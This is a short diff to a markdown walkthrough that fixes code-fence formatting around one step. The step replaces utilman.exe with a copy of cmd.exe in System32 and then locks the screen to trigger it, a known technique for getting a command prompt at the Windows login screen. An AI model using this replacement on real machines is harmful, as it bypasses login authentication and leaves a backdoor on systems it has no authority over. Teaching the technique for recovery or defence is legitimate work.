@@ -161,7 +161,8 @@ Successfully processed 1 files; Failed processing 0 files
 After this, we will replace utilman.exe with a copy of cmd.exe:
 
 Command Prompt
-```C:\Windows\System32\> copy cmd.exe utilman.exe
+```
+C:\Windows\System32\> copy cmd.exe utilman.exe
         1 file(s) copied.
 ```
 To trigger utilman, we will lock our screen from the start button:
